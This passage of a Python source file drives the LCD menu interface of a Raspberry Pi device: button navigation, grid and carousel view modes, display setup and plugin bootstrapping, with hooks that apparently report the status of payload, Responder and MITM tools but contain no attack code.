        # Display current view mode indicator
        # draw.text((2, 2), "Grid", font=text_font, fill=color.text)
        
        time.sleep(0.12)
        
        # Handle button input
        btn = getButton()
        if btn == "KEY_UP_PIN":
            if index >= GRID_COLS:
                index -= GRID_COLS
        elif btn == "KEY_DOWN_PIN":
            if index + GRID_COLS < total:
                index += GRID_COLS
        elif btn == "KEY_LEFT_PIN":
            if index > 0 and index % GRID_COLS != 0:
                index -= 1
        elif btn == "KEY_RIGHT_PIN":
            if index < total - 1 and (index + 1) % GRID_COLS != 0:
                index += 1
        elif btn == "KEY_PRESS_PIN":
            if index < total:
                m.select = index
                return inlist[index] if not duplicates else inlist[index].split('#', 1)[1]
        elif btn == "KEY1_PIN":
            # Toggle to list view
            toggle_view_mode()
            return ""
        elif btn == "KEY3_PIN":
            return ""  # Go back


def toggle_view_mode():
    """Cycle through list -> grid -> carousel -> list view modes."""
    if m.view_mode == "list":
        m.view_mode = "grid"
    elif m.view_mode == "grid":
        m.view_mode = "carousel"
    else:  # carousel
        m.view_mode = "list"
    m.select = 0  # Reset selection when switching views


def main():
    # Draw background once
    color.DrawMenuBackground()
    color.DrawBorder()

    start_background_loops()

    print("Booted in %s seconds! :)" % (time.time() - start_time))

    # Menu handling
    # Running functions from menu structure
    while True:
        # Use different view modes only for main menu ("a"), list view for all submenus
        if m.which == "a" and m.view_mode in ["grid", "carousel"]:
            if m.view_mode == "grid":
                selected_item = GetMenuGrid(m.GetMenuList())
            else:  # carousel
                selected_item = GetMenuCarousel(m.GetMenuList())
                
            if selected_item:
                # Find the index of the selected item
                menu_list = m.GetMenuList()
                x = -1
                for i, item in enumerate(menu_list):
                    if item == selected_item:
                        x = i
                        break
            else:
                x = -1
        else:
            x = m.GetMenuIndex(m.GetMenuList())
            
        if x >= 0:
            m.select = x
            if isinstance(m.menu[m.which][m.select][1], str):
                m.which = m.menu[m.which][m.select][1]
            elif isinstance(m.menu[m.which][m.select][1], list):
                m.menu[m.which][m.select][1][0](
                    m.menu[m.which][m.select][1][1])
            else:
                m.menu[m.which][m.select][1]()
        elif len(m.which) > 1:
            m.which = m.which[:-1]


### Default values + LCD init ###
default = Defaults()

LCD = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT  # SCAN_DIR_DFT = D2U_L2R
LCD.LCD_Init(Lcd_ScanDir)
LCD_Config.Driver_Delay_ms(5)  # 8
#LCD.LCD_Clear()

image = Image.open(default.install_path + 'img/logo.bmp')
LCD.LCD_ShowImage(image, 0, 0)

# Create draw objects BEFORE main() so color functions can use them
image = Image.new("RGB", (LCD.width, LCD.height), "WHITE")
draw = ImageDraw.Draw(image)
text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 9)
icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', 12)
font = text_font  # Keep backward compatibility

### Defining PINS, threads, loading JSON ###
PINS = {
    "KEY_UP_PIN": 6,
    "KEY_DOWN_PIN": 19,
    "KEY_LEFT_PIN": 5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN": 21,
    "KEY2_PIN": 20,
    "KEY3_PIN": 16
}
# edge-triggered set
EDGE_BUTTONS = {
    "KEY1_PIN",
    "KEY2_PIN",
    "KEY3_PIN",
    "KEY_LEFT_PIN",
    "KEY_RIGHT_PIN",
    "KEY_PRESS_PIN"
} 
_button_prev = {}
LoadConfig()
m = DisposableMenu()

# Initialize previous states for edge-detected buttons
for _bn, _pin in PINS.items():
    if _bn in EDGE_BUTTONS:
        try:
            _button_prev[_bn] = GPIO.input(_pin)
        except Exception:
            _button_prev[_bn] = 1  # assume released

### Plugin system bootstrap ###
_plugin_manager = None
if 'PluginManager' in globals() and PluginManager is not None:
    try:
        plugins_cfg_path = os.path.join(default.install_path, 'plugins', 'plugins_conf.json')
        # Auto-create a default configuration if missing
        if not os.path.isfile(plugins_cfg_path):
            os.makedirs(os.path.dirname(plugins_cfg_path), exist_ok=True)
            with open(plugins_cfg_path, 'w') as _pcf:
                json.dump({
                    "example_plugin": {
                        "enabled": True,
                        "priority": 50,
                        "options": {"show_seconds": False, "text_color": "white"}
                    }
                }, _pcf, indent=2)
        with open(plugins_cfg_path, 'r') as _pcf:
            _plugins_conf = json.load(_pcf)
        _plugin_manager = PluginManager()
        _plugin_context = {
            'exec_payload': lambda name: exec_payload(name),
            'get_menu': lambda: m.GetMenuList(),
            'is_responder_running': is_responder_running,
            'is_mitm_running': is_mitm_running,
            'draw_image': lambda: image,
            'draw_obj': lambda: draw,
            'status_bar': status_bar,
        }
        if hasattr(_plugin_manager, 'load_from_config'):
            _plugin_manager.load_from_config(_plugins_conf, _plugin_context)
        else:  # fallback
            legacy_list = [k for k, v in _plugins_conf.items() if v.get('enabled')]
            _plugin_manager.load_all(legacy_list, _plugin_context)
    except Exception as _pm_exc:
        print(f"[PLUGIN] Failed to bootstrap: {_pm_exc}")

### Info ###
print(time.strftime("%H:%M:%S"))

# Delay for logo
time.sleep(2)




if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        Leave()
